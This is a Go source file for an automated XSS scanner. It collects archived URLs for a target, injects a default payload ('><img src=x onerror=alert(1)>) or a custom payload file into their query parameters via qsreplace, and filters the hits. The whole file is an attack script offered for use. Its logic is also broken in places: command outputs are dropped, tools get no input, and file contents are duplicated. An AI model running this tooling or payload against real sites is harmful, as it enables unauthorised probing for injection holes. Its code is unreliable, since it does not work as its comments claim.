package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
)

// Function to run a command and capture its output
func runCommand(command string, args []string) ([]byte, error) {
	cmd := exec.Command(command, args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return output, fmt.Errorf("command failed: %v\nOutput: %s", err, string(output))
	}
	return output, nil
}

// Main function
func main() {
	// Define flags for custom payload and install option
	installFlag := flag.Bool("install", false, "Install required tools")
	payloadFlag := flag.String("payload", "", "Path to custom payload file")
	flag.Parse()

	// If install flag is set, install required tools
	if *installFlag {
		err := installTools()
		if err != nil {
			fmt.Println("[!] Error during installation:", err)
			return
		}
		fmt.Println("[+] Installation completed successfully!")
		return
	}

	// If custom payload file is provided, run with custom payload
	if *payloadFlag != "" {
		err := runWithCustomPayload(*payloadFlag)
		if err != nil {
			fmt.Println("[!] Error with custom payload:", err)
			return
		}
		return
	}

	// If no flags provided, run the default behavior
	if len(os.Args) < 2 {
		fmt.Println("[!] Usage: goos <url> [--payload <payload-file>]")
		return
	}

	targetURL := os.Args[1]

	// Run default steps if no payload is provided
	fmt.Println("[+] Running waybackurls...")
	waybackurlsOutput, err := runCommand("waybackurls", []string{targetURL})
	if err != nil {
		fmt.Println("[!] Error running waybackurls:", err)
		return
	}
	err = os.WriteFile("archive_links", waybackurlsOutput, 0644)
	if err != nil {
		fmt.Println("[!] Error writing archive_links:", err)
		return
	}

	// Step 2: Run gau
	fmt.Println("[+] Running gau...")
	gauOutput, err := runCommand("gau", []string{targetURL})
	if err != nil {
		fmt.Println("[!] Error running gau:", err)
		return
	}
	err = os.WriteFile("archive_links", appendToFile("archive_links", gauOutput), 0644)
	if err != nil {
		fmt.Println("[!] Error writing to archive_links:", err)
		return
	}

	// Step 3: Sort archive_links and remove duplicates
	fmt.Println("[+] Sorting and removing duplicates from archive_links...")
	_, err = runCommand("sort", []string{"-u", "archive_links"})
	if err != nil {
		fmt.Println("[!] Error sorting archive_links:", err)
		return
	}

	// Step 4: Run uro
	fmt.Println("[+] Running uro...")
	uroOutput, err := runCommand("uro", []string{"archive_links"})
	if err != nil {
		fmt.Println("[!] Error running uro:", err)
		return
	}
	err = os.WriteFile("archive_links_uro", uroOutput, 0644)
	if err != nil {
		fmt.Println("[!] Error writing archive_links_uro:", err)
		return
	}

	// Step 5: Run qsreplace with default payload
	fmt.Println("[+] Running qsreplace and freq with default payload...")
	qsreplaceCmd := "qsreplace"
	payload := "'><img src=x onerror=alert(1)>"
	qsreplaceOutput, err := runCommand(qsreplaceCmd, []string{payload})
	if err != nil {
		fmt.Println("[!] Error running qsreplace:", err)
		return
	}

	// Step 6: Run freq
	freqOutput, err := runCommand("freq", []string{})
	if err != nil {
		fmt.Println("[!] Error running freq:", err)
		return
	}

	// Save output to files
	err = os.WriteFile("freq_output", appendToFile("freq_output", freqOutput), 0644)
	if err != nil {
		fmt.Println("[!] Error writing to freq_output:", err)
		return
	}

	// Step 7: Filter XSS results
	err = os.WriteFile("freq_xss_findings", filterNotVulnerable(qsreplaceOutput), 0644)
	if err != nil {
		fmt.Println("[!] Error filtering and saving XSS findings:", err)
		return
	}

	fmt.Println("[+] Script Execution Ended")
}

// Function to install required tools
func installTools() error {
	// Add installation logic for Go tools (e.g., waybackurls, gau, ffuf)
	fmt.Println("[+] Installing tools...")
	err := goInstall("github.com/tomnomnom/waybackurls")
	if err != nil {
		return err
	}
	err = goInstall("github.com/lc/gau/v2/cmd/gau")
	if err != nil {
		return err
	}
	err = goInstall("github.com/ffuf/ffuf")
	if err != nil {
		return err
	}
	// You can add more tools here as needed
	return nil
}

// Function to install a Go-based tool
func goInstall(tool string) error {
	cmd := exec.Command("go", "install", tool)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to install tool %s: %v\nOutput: %s", tool, err, output)
	}
	return nil
}

// Function to process a custom payload file for qsreplace
func runWithCustomPayload(payloadFile string) error {
	// Read the custom payload file
	payload, err := ioutil.ReadFile(payloadFile)
	if err != nil {
		return fmt.Errorf("failed to read payload file: %v", err)
	}

	// Trim spaces and newline characters
	payloadStr := strings.TrimSpace(string(payload))
	if payloadStr == "" {
		return fmt.Errorf("payload file is empty")
	}

	// Pass the payload to qsreplace
	err = executeQsreplace(payloadStr)
	if err != nil {
		return err
	}

	fmt.Println("[+] Custom payload processing completed.")
	return nil
}

// Function to execute qsreplace with a custom payload
func executeQsreplace(payload string) error {
	// Example of running the qsreplace tool with the custom payload
	cmd := exec.Command("qsreplace", payload) // You can adjust this command as necessary
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to run qsreplace: %v\nOutput: %s", err, output)
	}

	// Print output from qsreplace (for debugging or confirmation)
	fmt.Println("[+] qsreplace output:\n", string(output))
	return nil
}

// Append content to an existing file (used for combining outputs)
func appendToFile(filename string, content []byte) []byte {
	existingContent, err := os.ReadFile(filename)
	if err != nil {
		fmt.Println("[!] Error reading file:", err)
	}
	return append(existingContent, content...)
}

// Filter out "Not Vulnerable" results from the output
func filterNotVulnerable(input []byte) []byte {
	lines := strings.Split(string(input), "\n")
	var filteredLines []string
	for _, line := range lines {
		if !strings.Contains(strings.ToLower(line), "not vulnerable") {
			filteredLines = append(filteredLines, line)
		}
	}
	return []byte(strings.Join(filteredLines, "\n"))
}
